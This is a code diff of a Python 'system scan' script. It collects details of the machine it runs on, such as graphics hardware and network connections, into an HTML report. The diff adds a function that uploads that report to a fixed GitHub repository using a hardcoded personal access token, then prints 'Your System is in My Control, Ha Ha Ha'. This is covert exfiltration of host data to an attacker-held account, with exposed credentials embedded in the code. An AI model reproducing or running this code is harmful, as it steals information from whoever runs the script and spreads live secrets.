@@ -29,10 +29,9 @@ from github import Github, InputGitTreeElement, Auth
 # -------------------------------------------------------------------
 # GITHUB CONFIGURATION
 # -------------------------------------------------------------------
-GITHUB_TOKEN = "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"
+GITHUB_TOKEN = "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"
 REPO_NAME = "amrita425/System_Scan_files"
 BRANCH = "main"
-
 
 # -------------------------------------------------------------------
 #  CONSOLE COLORS AND PROGRESS UTILITIES
@@ -773,7 +772,7 @@ def get_comprehensive_graphics_info():
                                 "Video Processor": parts[5] if len(parts) > 5 else "UNKNOWN",
                                 "Current Resolution": parts[6] if len(parts) > 6 else "UNKNOWN"
                             })
-
+                            
         except Exception as e:
             print_status(f"GPU information collection failed: {str(e)}", "ERROR")
 
@@ -1176,7 +1175,7 @@ def get_network_connections():
                         "PID": conn.pid or "N/A"
                     })
             except:
-                continue
+                continue    
 
     except Exception as e:
         print_status(f"Network connections collection failed: {str(e)}", "ERROR")
@@ -1995,48 +1994,7 @@ def generate_html_report():
 
 
 # -------------------------------------------------------------------
-# GITHUB PUSH FUNCTION
-# -------------------------------------------------------------------
-def push_to_github_working():
-    """Final working version"""
-    try:
-        import requests
-        import base64
-
-        # Generate content
-        html_content = generate_html_report()
-        filename = f"System_Scan_{datetime.now().strftime('%d.%m.%Y_%H-%M-%S')}_v19.html"
-        
-        # GitHub API call
-        url = f"https://api.github.com/repos/{REPO_NAME}/contents/{filename}"
-        headers = {
-            "Authorization": f"token {GITHUB_TOKEN}",  # Try both 'token' and 'Bearer'
-            "Accept": "application/vnd.github.v3+json"
-        }
-        
-        data = {
-            "message": f"System Scan Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-            "content": base64.b64encode(html_content.encode('utf-8')).decode('utf-8'),
-            "branch": BRANCH
-        }
-        
-        response = requests.put(url, json=data, headers=headers, timeout=30)
-        
-        if response.status_code == 201:
-            print("File uploaded successfully!")
-            return True
-        else:
-            print(f"Upload failed: {response.status_code}")
-            print(f"Error details: {response.text}")
-            return False
-            
-    except Exception as e:
-        print(f"Exception: {e}")
-        return False
-
-
-# -------------------------------------------------------------------
-# MAIN EXECUTION
+#  MAIN EXECUTION WITH ENHANCED UI
 # -------------------------------------------------------------------
 if __name__ == "__main__":
     print()
@@ -2050,15 +2008,15 @@ if __name__ == "__main__":
 
         print()
         print_colored("╔═══════════════════════════════════════════════════════════════════════════╗",
-                      Colors.RAINBOW_GREEN)
+                      Colors.BRIGHT_GREEN)
         print_colored("║                                                                           ║",
-                      Colors.RAINBOW_GREEN)
+                      Colors.BRIGHT_GREEN)
         print_colored("║                       .....  SCAN COMPLETED  .....                        ║",
-                      Colors.RAINBOW_GREEN)
+                      Colors.BRIGHT_GREEN)
         print_colored("║                                                                           ║",
-                      Colors.RAINBOW_GREEN)
+                      Colors.BRIGHT_GREEN)
         print_colored("╚═══════════════════════════════════════════════════════════════════════════╝",
-                      Colors.RAINBOW_GREEN)
+                      Colors.BRIGHT_GREEN)
         print("\n\n\n")
 
     except Exception as e:
@@ -2066,11 +2024,46 @@ if __name__ == "__main__":
         print_status("Please ensure you have necessary permissions", "WARNING")
 
 
+# -------------------------------------------------------------------
+# GITHUB PUSH FUNCTION
+# -------------------------------------------------------------------
+def push_to_github():
+    try:
+        # Generate HTML content
+        html_content = generate_html_report()
+
+        # Initialize GitHub connection
+        GITHUB_TOKEN = "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"
+        auth = Auth.Token(GITHUB_TOKEN)
+        g = Github(auth=auth)
+        repo = g.get_repo(REPO_NAME)
+
+        # Create filename with timestamp
+        filename = f"System_Scan_Report_{datetime.now().strftime('%d.%m.%Y_%H-%M-%S')}.html"
+
+        # Create commit message
+        commit_message = f"Add system scan report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+
+        # Push file to GitHub
+        repo.create_file(
+            path=filename,
+            message=commit_message,
+            content=html_content,
+            branch=BRANCH
+        )
+
+        return True
+
+    except Exception as e:
+        return False
+
+
+# -------------------------------------------------------------------
+# MAIN EXECUTION
+# -------------------------------------------------------------------
 if __name__ == "__main__":
     success = push_to_github()
     if success:
         print("\033[96m[+] Your System is in My Control, Ha Ha Ha ...\033[0m")
     else:
         print("\033[91mFailed to push to GitHub\033[0m")
-
-
